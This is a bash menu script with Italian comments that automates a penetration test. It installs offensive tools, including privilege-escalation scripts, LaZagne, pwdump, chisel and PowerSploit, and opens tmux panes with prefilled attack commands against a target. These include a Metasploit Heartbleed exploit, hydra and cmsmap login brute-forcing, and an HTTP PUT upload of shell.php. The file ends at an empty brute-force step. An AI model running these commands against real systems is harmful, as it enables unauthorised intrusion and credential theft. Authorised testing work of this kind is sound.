#!/bin/bash

source "common.sh"

open_terminal() {
    # Determina il terminale da utilizzare in base al sistema operativo
    if command -v gnome-terminal &>/dev/null; then
        gnome-terminal --tab -e "$1"
    elif command -v konsole &>/dev/null; then
        konsole --new-tab -e "$1"
    elif command -v xterm &>/dev/null; then
        xterm -e "$1"
    elif command -v qterminal &>/dev/null; then
        qterminal -e "$1"
    else
        # Nessun terminale specifico trovato, apre una nuova finestra di terminale di default
        echo "No specific terminal found. Default terminal opening."
        x-terminal-emulator -e "$1"
    fi
}

while true
do
    echo ""
    echo ""    
    echo "Select actions on [$site]:"
    echo "1. WEAPONIZATION: install usefull tools for penetration test."
    echo "2. EXPLOITATION: Information gathering, serviz information gathering, quick win, etc."
    echo "3. WEB APP: Site fingerprint (site structure, virtual host, etc)"
    echo "4. WEB APP: Information gathering (google dork, CMS, etc)"
    echo "5. WEB APP: AuthN bypass (brute force, command injection, webDAV, etc)"
    read -p "Enter the number of the desired action (0 to exit): " choice

    case $choice in
        0)
            echo "Uscita dal programma."
            break
            ;;
        1)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> WEAPONIZATION
######################
######################
            open_terminal "bash -c 'echo WEAPONIZATION; sleep 2;"
# Parametri
folderLin="/opt/_lin"
folderWin="/opt/_win"

# Funzione per verificare se un programma è installato
is_installed() {
    local program="$1"
    if command -v "$program" &> /dev/null; then
	return 0 # Installato
    else
	return 1 # Non installato
    fi
}



# ===
# === APPLICAZIONI DA INSTALLARE SU KALI
# ===

echo " ==="
echo " === Utilità da installare su Kali ==="
echo " ==="

# seclists
program="seclists"
echo ""
if ! is_installed "$program"; then
	echo "[->] Installing $program..."
	# Comando di installazione del programma
	# Esempio: sudo apt-get install -y "$program"
	cd /usr/share
	sudo apt-get install $1
else
	echo "[i] $program is already installed."
fi

# impacket
echo ""
program="python3-impacket"
pathAppo="/usr/share/doc/python3-impacket/examples"
if [ -d "$pathAppo" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."
	# Comando di installazione del programma
	# Esempio: sudo apt-get install -y "$program"
	cd /opt
	sudo apt-get install $1
fi

# impacket
echo ""
program="nishang"
if ! is_installed "$program"; then
	echo "[->] Installing $program..."
	# Comando di installazione del programma
	# Esempio: sudo apt-get install -y "$program"
	cd /opt
	sudo apt-get install $1
else
	echo "[i] $program is already installed."
fi

# mingw-w64
echo ""
program="mingw-w64"
if ! is_installed "i686-w64-mingw32-gcc"; then
	echo "[->] Installing $program..."
	# Comando di installazione del programma
	# Esempio: sudo apt-get install -y "$program"
	cd /opt
	sudo apt-get install $1
else
	echo "[i] $program is already installed."
fi

# script nmap
echo ""
program="nmap script (vulnscan, vulners)"
pathAppo="/usr/share/nmap/scripts/vulscan"
if [ -d "$pathAppo" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."
	cd /usr/share/nmap/scripts/
	sudo git clone https://github.com/vulnersCom/nmap-vulners.git
	sudo git clone https://github.com/scipag/vulscan.git
	cd /usr/share/nmap/scripts/vulscan/
	chmod +x update.sh
	sudo ./update.sh
fi

#Nessus
echo ""
program="Nessus 10.6.3"
cd /opt
if [ -e "Nessus-10.6.3-ubuntu1404_amd64.deb" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo curl --request GET --url 'https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.6.3-ubuntu1404_amd64.deb' --output 'Nessus-10.6.3-ubuntu1404_amd64.deb'
	sudo dpkg -i Nessus-10.6.3-ubuntu1404_amd64.deb
fi

# kitrunner (analisi API)
echo ""
program="Kitrunner"
cd /opt
if [ -e "kr" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo wget https://github.com/assetnote/kiterunner/releases/download/v1.0.2/kiterunner_1.0.2_linux_386.tar.gz
	sudo gunzip kiterunner_1.0.2_linux_386.tar.gz
	sudo tar -xvf kiterunner_1.0.2_linux_386.tar 
	sudo chmod 755 ./kr
fi


# uniscan (automatizzo il command injection)
echo ""
program="uniscan"
cd /opt
if ! is_installed "uniscan"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo apt-get install uniscan
fi

# juumscan (automatizzo l'analisi delle vulnerabilità di joomla)
echo ""
program="juumla"
cd /opt
if ! is_installed "juumla"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo git clone https://github.com/oppsec/juumla.git
fi

# droopescan (automatizzo l'analisi delle vulnerabilità di drupal)
echo ""
program="droopescan"
cd /opt
if ! is_installed "droopescan"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	pip install droopescan 
fi


# wisker / cupp (automatizzo la creazione di un dizionario)
echo ""
program="wisker"
if ! is_installed "wisker"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	pip install wisker 
fi
program="cupp"
if ! is_installed "cupp"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo apt-get install cupp
fi


# cmsmap (bruteforce su Joomla, WOrdpress e Drupal)
echo ""
program="cmsmap"
cd /opt
if ! is_installed "droopescan"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo  git clone https://github.com/Dionach/CMSmap
	cd /opt/CMSmap 
	sudo pip3 install .
fi




# Synk e copilot
echo ""
echo "[A] Synk e Copilot non possono essere installati in automatico"
echo "    Per installarli vedi githib di ippsec"
echo "    https://github.com/IppSec/parrot-build"





# ===
# === APPLICAZIONI PER TARGET LINUX
# ===
echo ""
echo ""
echo " ==="
echo " === Utilità per Target Linux ==="
echo " ==="

# Verifica se la cartella esiste
if [ ! -d "$folderLin" ]; then
    mkdir -p "$folderLin"
    echo "[i] Cartella $folderLin creata con successo"
else
    echo "[i] La cartella $folderLin esiste già."
fi

#File singoli da scaricare nella cartella
cd $folderLin
# Crea il file download.txt con 10 URL
cat << EOF > download.txt
https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py
https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat
https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nping
https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
https://github.com/jpillora/chisel/releases/download/v1.7.4/chisel_1.7.4_linux_386.gz
https://github.com/hugsy/gdb-static/raw/master/gdb-7.10.1-x32
EOF
# Scarica i file utilizzando wget
echo ""
echo "[i] download applicativi"
wget -N -i download.txt

#completo l'installazione di chisel
echo ""
echo "[i] Completo l'installazione di chisel"
sudo gunzip chisel_1.7.4_linux_386.gz 
sudo mv chisel_1.7.4_linux_386 chisel 
sudo chmod 755 *
sudo upx brute chisel


# Installo applicazioni per analisi SMB: crackmap, impacket
echo ""
echo "[i] Installazione applicazioni per analisi SMB: crackmap, impacket"
cd /opt/
sudo apt-get install crackmapexec
sudo apt-get install python3-impacket









# ===
# === APPLICAZIONI PER TARGET WINDOWS
# ===
echo ""
echo ""
echo " ==="
echo " === Utilità per Target Windows ==="
echo " ==="

# Verifica se la cartella esiste
if [ ! -d "$folderWin" ]; then
    mkdir -p "$folderWin"
    echo "[i] Cartella $folderWin creata con successo"
else
    echo "[i] La cartella $folderWin esiste già."
fi

#File singoli da scaricare nella cartella
cd $folderWin
# Crea il file download.txt con 10 URL
cat << EOF > download.txt
https://github.com/carlospolop/PEASS-ng/releases/download/20220508/winPEAS.bat
https://github.com/carlospolop/PEASS-ng/releases/download/20220508/winPEASx64.exe
https://github.com/carlospolop/PEASS-ng/releases/download/20220508/winPEASx86.exe
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1
https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/nmap.exe
https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/nping.exe
https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/ncat.exe
https://github.com/jpillora/chisel/releases/download/v1.7.4/chisel_1.7.4_windows_386.gz
EOF
# Scarica i file utilizzando wget
echo ""
echo "[i] download applicativi"
wget -N -i download.txt

#completo l'installazione di chisel
echo ""
echo "[i] Completo l'installazione di chisel"
sudo gunzip chisel_1.7.4_windows_386.gz 
sudo mv chisel_1.7.4_windows_386 chisel.exe 
sudo upx brute chisel.exe

# SharpCollection
echo ""
echo "[i] Installazione di sharpCollection"
sudo git clone https://github.com/Flangvik/SharpCollection.git

# samdump, pwdump, procdump
#SAMDUMP2
echo ""
echo "[i] Installazione di samdump2"
sudo apt install samdump2
# PWDUMP
echo ""
echo "[i] Installazione di Pwdump"
sudo wget -N https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip
sudo unzip -o pwdump8-8.2.zip
sudo chmod 755 ./pwdump8
sudo chmod 755 ./pwdump8/*
# PROCDUMP
echo ""
echo "[i] Installazione di ProcDump"
sudo wget -N https://download.sysinternals.com/files/Procdump.zip
sudo unzip -o Procdump.zip
sudo chmod 755 *
;;

            
            
            
            
            

        2)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> EXPLOITATION
######################
######################


open_terminal "bash -c 'echo EXPLOITATION; sleep 2;"
# contiene:
# - le funzioni comuni
# - la richiesta dei parametri utente
# - la creazione delle cartelle di progetto
#source "common.sh"

# Creazione di una sessione Tmux con attivazione VPN
tmux new-session -d -s PT -n "varie ed eventuali"

# OPEN-VPN
#tmux new-window -t PT:1 -n 'openVPN'
#tmux send-keys -t PT:1 "sudo openvpn /home/kali/Desktop/htb/lab_dok72.ovpn" Enter


# INFORMATION GATHERING
cd $folderProjectInfoGathering
# Layout
tmux new-window -t PT:1 -n 'Information Gathering (dmitry, theharvester ...)'
tmux split-window -v -t PT:1.0
tmux split-window -v -t PT:1.1
tmux split-window -v -t PT:1.2
tmux split-window -v -t PT:1.3
# Esecuzione dei comandi nelle sottofinestre
# NMAP TCP - UDP
tmux send-keys -t PT:1.0 "# dmitry" Enter
tmux send-keys -t PT:1.0 "dmitry -news $domain -o $folderProjectInfoGathering/dmitry.txt"
tmux send-keys -t PT:1.1 "# theHarvester" Enter
tmux send-keys -t PT:1.1 "theHarvester -d $domain -b all -l 500 -f $folderProjectInfoGathering/theharvester.html"
tmux send-keys -t PT:1.2 "# ping to analyze OS" Enter
tmux send-keys -t PT:1.2 "ping -c 4 $ip"
tmux send-keys -t PT:1.3 "# nmap to find OS" Enter
tmux send-keys -t PT:1.3 "sudo nmap -Pn -O $ip"
cd $folderProject

# SERVICE INFORMATION GATHERING
cd $folderProjectServiceInfoGathering
# Layout
tmux new-window -t PT:2 -n 'Service Information Gathering (nmap)'
tmux split-window -v -t PT:2.0
tmux split-window -v -t PT:2.1
tmux split-window -v -t PT:2.2
tmux select-pane -t "2.2"
tmux split-window -h -t "2.2"
tmux split-window -h -t "2.2"
# Esecuzione dei comandi nelle sottofinestre
# NMAP TCP - UDP
tmux send-keys -t PT:2.0 "# nmap (TCP)" Enter
tmux send-keys -t PT:2.0 "sudo nmap -sV -vv -p- -T5 --script firewall-bypass $ip -oA out.TCP"
tmux send-keys -t PT:2.1 "# nmap (UDP)" Enter
tmux send-keys -t PT:2.1 "sudo nmap -sU -Pn -p 53,69,123,161,1985,777,3306 -T5 $ip -oA out.UDP"
tmux send-keys -t PT:2.2 "# nmap (on specific port)" Enter
tmux send-keys -t PT:2.2 "sudo nmap -Pn --script vuln --script firewall-bypass $ip -oA out.SPEC -p <ports>"
tmux send-keys -t PT:2.3 "# nmap (on specific port - vulners)" Enter
tmux send-keys -t PT:2.3 "sudo nmap --script nmap-vulners/ -sV $ip -oA out.SPEC.vulners -p <ports>"
tmux send-keys -t PT:2.4 "# nmap (on specific port - vulscan)" Enter
tmux send-keys -t PT:2.4 "sudo nmap --script vulscan/ -sV $ip -oA out.SPEC.vulscan -p <ports>"
cd $folderProject

# QUICK WIN
cd $folderProjectQuickWin
# Layout
tmux new-window -t PT:3 -n 'QuickWin'
tmux split-window -v -t PT:3.0
tmux split-window -v -t PT:3.1
tmux split-window -v -t PT:3.2
tmux split-window -v -t PT:3.3
# Esecuzione dei comandi nelle sottofinestre
# FIREFOX
tmux send-keys -t PT:3.0 "# gogoduck vulnerability scan" Enter
tmux send-keys -t PT:3.0 "xdg-open \"https://google.com/?q=<servizio>+default+password\" & xdg-open \"https://google.com/?q=<servizio>+default+credentials\" & xdg-open \"https://google.com/?q=<servizio>+vulnerability+poc+github\" & xdg-open \"https://google.com/?q=<servizio>+exploit+poc+github\""
tmux send-keys -t PT:3.1 "# searchsploit vulnerability scan" Enter
tmux send-keys -t PT:3.1 "searchsploit \"<servizio>\""
tmux send-keys -t PT:3.2 "# msfconsole vulnerability scan" Enter
tmux send-keys -t PT:3.2 "msfupdate; msfconsole -qx \"search type:exploit <servizio>\""
tmux send-keys -t PT:3.3 "# nessus vulnerability scan" Enter
tmux send-keys -t PT:3.3 "sudo systemctl start nessusd & xdg-open \"https://127.0.0.1:8834/\""

cd $folderProject

# Attivazione della modalità interattiva
tmux -2 attach-session -t PT
;;
            
            
            
            
            
        3)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> WEB APP: FINGER-PRINT
######################
######################

open_terminal "bash -c 'echo WEB APP: site fingerprint; sleep 2;"
# Creazione di una sessione Tmux con attivazione VPN
tmux new-session -d -s PT -n "varie ed eventuali"

# OPEN-VPN
#tmux new-window -t PT:1 -n 'openVPN'
#tmux send-keys -t PT:1 "sudo openvpn /home/kali/Desktop/htb/lab_dok72.ovpn" Enter

# WEB Site Structure
cd $folderProjectWebFingerprint
# Layout
tmux new-window -t PT:1 -n 'WEB Site Structure'
tmux split-window -v -t PT:1.0  
tmux split-window -v -t PT:1.1 
tmux split-window -v -t PT:1.2 
tmux select-pane -t "1.2"
tmux split-window -h -t "1.2"
tmux split-window -h -t "1.2"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:1.0 "# get common file (robots, sitemap, ...)" Enter
tmux send-keys -t PT:1.0 "wget ""http://$site/robots.txt"" ""http://$site/sitemap.xml"" ""http://$site/crosssite.xml"" ""http://$site/phpinfo.php"" ""http://$site/index.php"" ""http://$site/index.html"""
tmux send-keys -t PT:1.1 "# find a valid dictionary" Enter
tmux send-keys -t PT:1.1 "find /usr/share/seclists/ | grep dir | xargs wc -l  | sort -n # search dictionary"
tmux send-keys -t PT:1.2 "# site folder structure. Try also webDAV on found folders (see 03.2-webApp-AuthNbypass.sh)" Enter
tmux send-keys -t PT:1.2 "gobuster dir -u http://$site -x php,html -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
tmux send-keys -t PT:1.3 "# if target site respond always 20x" Enter
tmux send-keys -t PT:1.3 "fuff -u http://$site/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 2066"
tmux send-keys -t PT:1.4 "# if target site respond always 30x" Enter
tmux send-keys -t PT:1.4 "gobuster dir -u http://$site -x php,html -w /usr/share/wordlists/dirb/common.txt -b \"204,301,302,307,401,403\" # if target answer always 30x"
cd $folderProject



# WEB Virtual Host
cd $folderProjectWebFingerprint
# Layout
tmux new-window -t PT:2 -n 'WEB Virtual Host'
tmux split-window -v -t PT:2.0
tmux split-window -v -t PT:2.1
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:2.0 "# find a valid dictionary" Enter
tmux send-keys -t PT:2.0 "find /usr/share/seclists/ -follow | grep subdomain | xargs wc -l | sort -nr # search dictionary"
tmux send-keys -t PT:2.1 "# site virtual host" Enter
tmux send-keys -t PT:2.1 "wfuzz -H "Host: FUZZ."$domain -u http://$ip -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hh 178"
cd $folderProject


# WEB Metodi Attivi
cd $folderProjectWebFingerprint
# Layout
tmux new-window -t PT:3 -n 'WEB Metodi Attivi'
tmux split-window -v -t PT:3.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:3.0 "# HTTP method allowed" Enter
tmux send-keys -t PT:3.0 "URL=\"http://$site\"; for method in \"OPTIONS\" \"GET\" \"POST\" \"PUT\" \"DELETE\"; do echo \"Testing \$method method:\"; curl -X \$method -I \$URL; echo \"-------------------------\"; done"
cd $folderProject


# WEB Estensione File
cd $folderProjectWebFingerprint
# Layout
tmux new-window -t PT:4 -n 'WEB Estensione File'
tmux split-window -v -t PT:4.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:4.0 "# find files with multiple extension" Enter
tmux send-keys -t PT:4.0 "wfuzz -c -w /usr/share/wordlists/dirb/common.txt -w /usr/share/wordlists/dirb/extensions_common.txt --sc 200 http://$site/FUZZFUZ2Z"
cd $folderProject



# WEB API
cd $folderProjectWebFingerprint
# Layout
tmux new-window -t PT:5 -n 'WEB API'
tmux split-window -v -t PT:5.0
tmux split-window -v -t PT:5.1
tmux split-window -v -t PT:5.2
tmux split-window -v -t PT:5.3
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:5.0 "# find kr dictionary" Enter
tmux send-keys -t PT:5.0 "/opt/kr wordlist list"
tmux send-keys -t PT:5.1 "# find endPoint with kr" Enter
tmux send-keys -t PT:5.1 "/opt/kr scan http://$site -A httparchive_apiroutes_2023_10_28.txt # find endpoint auto"
tmux send-keys -t PT:5.2 "# find endPoint with wfuzz" Enter
tmux send-keys -t PT:5.2 "wfuzz -X POST -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$site/api/v1/FUZZ --hc 403,404 # find endpoint manually"
tmux send-keys -t PT:5.3 "# analyze endPoint with curl " Enter
tmux send-keys -t PT:5.3 "curl -X POST http://$site/api/v1/user # play with version"



# Guessing GET / POST Parameter
cd $folderProjectWebFingerprint
# Layout
tmux new-window -t PT:6 -n 'Guessing GET/POST param'
tmux split-window -v -t PT:6.0
tmux split-window -v -t PT:6.1
tmux split-window -v -t PT:6.2
tmux split-window -v -t PT:6.3
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:6.0 "# find a valid parameter (GET)" Enter
tmux send-keys -t PT:6.0 "wfuzz --hh=24 -c  -w /usr/share/dirb/wordlists/big.txt http://$site/action.php?FUZZ=test"
tmux send-keys -t PT:6.1 "# find a valid value (GET)" Enter
tmux send-keys -t PT:6.1 "wfuzz --hh=24 -c  -w /usr/share/dirb/wordlists/big.txt http://$site/action.php?Param1=FUZZ"
tmux send-keys -t PT:6.2 "# find a valid parameter (POST)" Enter
tmux send-keys -t PT:6.2 "wfuzz -w /usr/share/dirb/wordlists/big.txt --hl 20 -d "name=dok&FUZZ=1" http://$site/action.php"
tmux send-keys -t PT:6.3 "# find a valid value (POST)" Enter
tmux send-keys -t PT:6.3 "wfuzz -w /usr/share/dirb/wordlists/big.txt --hl 20 -d "name=dok&Param1=FUZZ" http://$site/action.php"




# WEB Site Info
cd $folderProjectWebFingerprint
# Layout
tmux new-window -t PT:7 -n 'WEB Site Info'
tmux split-window -v -t PT:7.0
tmux split-window -v -t PT:7.1
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:7.0 "# get favicon and its creation date" Enter
tmux send-keys -t PT:7.0 "wget http://$site/images/favicon.ico; exiftool favicon.ico"
tmux send-keys -t PT:7.1 "# cookie analysis to get information about site framework " Enter
tmux send-keys -t PT:7.1 "curl -s -I http://$site"
cd $folderProject


# Attivazione della modalità interattiva
tmux -2 attach-session -t PT
;;









       4)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> WEB APP: INFORMATION-GATHERING
######################
######################
open_terminal "bash -c 'echo WEB APP: INformation GAthering; sleep 2;"
# Creazione di una sessione Tmux con attivazione VPN
tmux new-session -d -s PT -n "varie ed eventuali"

# OPEN-VPN
#tmux new-window -t PT:1 -n 'openVPN'
#tmux send-keys -t PT:1 "sudo openvpn /home/kali/Desktop/htb/lab_dok72.ovpn" Enter

# WEB nmap whois
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:1 -n 'WEB nmap whois'
tmux split-window -v -t PT:1.0  
tmux split-window -v -t PT:1.1 
tmux split-window -v -t PT:1.2 
tmux split-window -v -t PT:1.3 
tmux select-pane -t "1.2"
tmux split-window -h -t "1.2"
tmux split-window -h -t "1.2"
tmux select-pane -t "1.5"
tmux split-window -h -t "1.5"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:1.0 "# nmap on 80 port" Enter
tmux send-keys -t PT:1.0 "nmap -Pn -sC -sV -T4 -p 80 $ip -oA out.80.infoGathering"
tmux send-keys -t PT:1.1 "# nmap pm 80 port with specific script" Enter
tmux send-keys -t PT:1.1 "nmap -Pn -vv -p 80 --script=http-* $ip -oA out.80.InfoGathering-script"
tmux send-keys -t PT:1.2 "# GET normal request" Enter
tmux send-keys -t PT:1.2 "echo -e \"GET / HTTP/1.0\n\" | nc -nv $ip 80"
tmux send-keys -t PT:1.3 "# GET error request" Enter
tmux send-keys -t PT:1.3 "echo -e \"GET / HTTP/3.0\n\" | nc -nv $ip 80"
tmux send-keys -t PT:1.4 "# GET error request" Enter
tmux send-keys -t PT:1.4 "echo -e \"GET / JUNK/1.0\n\" | nc -nv $ip 80"
tmux send-keys -t PT:1.5 "# whois domain" Enter
tmux send-keys -t PT:1.5 "whois $domain"
tmux send-keys -t PT:1.6 "# whois IP" Enter
tmux send-keys -t PT:1.6 "whois $ip"
cd $folderProject



# WEB Analisi del certificato HTTPS
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:2 -n 'WEB Certificato HTTPS'
tmux split-window -v -t PT:2.0
tmux split-window -v -t PT:2.1
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:2.0 "# SSL analysis with sslscan" Enter
tmux send-keys -t PT:2.0 "sslscan $ip"
tmux send-keys -t PT:2.1 "# certificate analysis" Enter
tmux send-keys -t PT:2.1 "openssl s_client -connect $site:443 </dev/null 2>/dev/null | openssl x509 -out $site.crt; echo \"Certificato scaricato: $site.crt\" # get certificate info"
cd $folderProject


# WEB google dork
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:3 -n 'WEB google dork'
tmux split-window -v -t PT:3.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:3.0 "domain=$domain" Enter
tmux send-keys -t PT:3.0 "ip=$ip" Enter
tmux send-keys -t PT:3.0 "site=$site" Enter
tmux send-keys -t PT:3.0 "# google dork" Enter
#tmux send-keys -t PT:3.0 "xdg-open \"https://google.com/?q=site:$domain filetype:php\" & xdg-open \"https://google.com/?q=site:$domain intitle:\"\"index of\"\" \"\"parent directory\"\"\" & xdg-open \"https://google.com/?q=site:$domain -site:www.$domain\" & xdg-open \"https://google.com/?q=site:pastebin.com $domain\" & xdg-open \"https://google.com/?q=site:github.com $domain\" & xdg-open \"https://google.com/?q=site:pastebin.com intext:$domain\" # google dork"
tmux send-keys -t PT:3.0 "grep -v '^#' $folderProjectEngine/google-dork.txt | sed 's/\$domain/\\$domain/g' | xargs -I {} xdg-open \"https://google.com/?q=\"{}"

cd $folderProject


# WEB Information from web
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:4 -n 'WEB Information from web'
tmux split-window -v -t PT:4.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:4.0 "# get info from search site" Enter
tmux send-keys -t PT:4.0 "xdg-open \"https://securityheaders.com/\" & xdg-open \"https://www.ssllabs.com/ssltest/\" & xdg-open \"https://www.social-searcher.com/\""
cd $folderProject


# openssl_heartbleed
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:5 -n 'openssl_heartbleed'
tmux split-window -v -t PT:5.0
tmux split-window -v -t PT:5.1
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:5.0 "# verify heartbleed with nmap" Enter
tmux send-keys -t PT:5.0 "nmap -sV --script=ssl-heartbleed $ip"
tmux send-keys -t PT:5.1 "# attack target by means of heartbleed" Enter
tmux send-keys -t PT:5.1 "msfconsole -q -x \"use auxiliary/scanner/ssl/openssl_heartbleed;set RHOSTS $ip;set RPORT 443;set VERBOSE true;exploit;\""
cd $folderProject



# CMS: Joomla, wordpress, drupal & co
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:6 -n 'CMS: Joomla, wordpress, drupal & co'
tmux split-window -v -t PT:6.0
tmux split-window -v -t PT:6.1
tmux split-window -v -t PT:6.2
tmux split-window -v -t PT:6.3
tmux split-window -v -t PT:6.4
tmux select-pane -t "6.0"
tmux split-window -h -t "6.0"
tmux split-window -h -t "6.0"
tmux select-pane -t "6.3"
tmux split-window -h -t "6.3"
tmux split-window -h -t "6.3"
tmux split-window -h -t "6.3"
tmux select-pane -t "6.7"
tmux split-window -h -t "6.7"
tmux split-window -h -t "6.7"
tmux split-window -h -t "6.7"
tmux select-pane -t "6.11"
tmux split-window -h -t "6.11"

# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:6.0 "# update (if necessary) scan tools" Enter
tmux send-keys -t PT:6.0 "wpscan --update; joomscan update; cmsmap http://$site --update"
tmux send-keys -t PT:6.1 "# whatweb analysis of target site" Enter
tmux send-keys -t PT:6.1 "whatweb -a 3 http://$site"
tmux send-keys -t PT:6.2 "# cmsmap to scan target" Enter
tmux send-keys -t PT:6.2 "cmsmap http://$site -F"
tmux send-keys -t PT:6.3 "# wordpress scan with nmap analysis" Enter
tmux send-keys -t PT:6.3 "nmap -Pn -vv -p 80 --script=http-wordpress* $ip -oA out.wp"
tmux send-keys -t PT:6.4 "# wpscan with principal plugins and themes" Enter
tmux send-keys -t PT:6.4 "wpscan --url http://$site --enumerate p,t,cb,dbe,u --plugins-detection aggressive --api-token $wptoken -o wpscan.txt [--disable-tls-checks]"
tmux send-keys -t PT:6.5 "# wpscan with all plugins and themes" Enter
tmux send-keys -t PT:6.5 "wpscan --url http://$site --enumerate ap,at,cb,dbe,u --plugins-detection aggressive --api-token $wptoken  -o wpscanALL.txt[--disable-tls-checks]"
tmux send-keys -t PT:6.6 "# cmsmap bruteforceCMS" Enter
tmux send-keys -t PT:6.6 "sudo cmsmap https://$site -u $pathFile_users -p $pathFile_passwords -f W"
tmux send-keys -t PT:6.7 "# joomscam target site" Enter
tmux send-keys -t PT:6.7 "joomscan -u http://$site"
tmux send-keys -t PT:6.8 "# msfconsole to test joomla target site" Enter
tmux send-keys -t PT:6.8 "msfconsole -q -x \"use auxiliary/scanner/http/joomla_plugins;set RHOSTS $ip;set THREADS 5;run\""
tmux send-keys -t PT:6.9 "# juumla to test joomla target site" Enter
tmux send-keys -t PT:6.9 "python /opt/juumla/main.py -u http://$site"
tmux send-keys -t PT:6.10 "# cmsmap bruteforce" Enter
tmux send-keys -t PT:6.10 "sudo cmsmap https://$site -u ../users.txt -p ../passwords.txt -f J"
tmux send-keys -t PT:6.11 "# scan drupal site with droopescan" Enter
tmux send-keys -t PT:6.11 "droopescan scan drupal -u http://$site -t 32"
cd $folderProject




# Attivazione della modalità interattiva
tmux -2 attach-session -t PT

            
;;
        5)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> WEB APP: AUTHN-BYPASS
######################
######################
open_terminal "bash -c 'echo WEB APP: authN bypass; sleep 3;"
# Creazione di una sessione Tmux con attivazione VPN
tmux new-session -d -s PT -n "varie ed eventuali"

# OPEN-VPN
#tmux new-window -t PT:1 -n 'openVPN'
#tmux send-keys -t PT:1 "sudo openvpn /home/kali/Desktop/htb/lab_dok72.ovpn" Enter

# WEB PUT HTTP
cd $folderProjectWebAuthN
# Layout
tmux new-window -t PT:1 -n 'WEB PUT HTTP'
tmux split-window -v -t PT:1.0  
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:1.0 "# exploit PUT method attack" Enter
tmux send-keys -t PT:1.0 "nmap -p 80 --script http-put --script-args http-put.url='/test/shell.php',http-put.file='shell.php' $ip # HTTP PUT Example" 
cd $folderProject



# WEB Bruteforce AuthN
cd $folderProjectWebAuthN
# Layout
tmux new-window -t PT:2 -n 'WEB Bruteforce AuthN'
tmux split-window -v -t PT:2.0
tmux split-window -v -t PT:2.1
tmux split-window -v -t PT:2.2
tmux select-pane -t "2.1"
tmux split-window -h -t "2.1"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:2.0 "# find valid dictionary for bruteforce" Enter
tmux send-keys -t PT:2.0 "find /usr/share/seclists/ | grep user | xargs wc -l | sort -n"
tmux send-keys -t PT:2.1 "# bruteforce POST authN" Enter
tmux send-keys -t PT:2.1 "hydra $ip http-form-post \"/form/login.php:user=^USER^&pass=^PASS^:INVALID LOGIN\" -l $pathFile_users -P $pathFile_passwords -vV -f"
tmux send-keys -t PT:2.2 "# bruteforce POST authN with BurpSuite saved request" Enter
tmux send-keys -t PT:2.2 "ffuf -request BurpSavedRequest.txt -request-proto http -w $pathFile_users:FUZZUSR,$pathFile_passwords:FUZZPW $ip"
tmux send-keys -t PT:2.3 "# bruteforce BasicAuth authN" Enter
tmux send-keys -t PT:2.3 "hydra -L $pathFile_users -P $pathFile_passwords -f $ip http-get / # Bruteforce BasicAuth authN"
tmux send-keys -t PT:2.4 "# bruteforce CMS" Enter
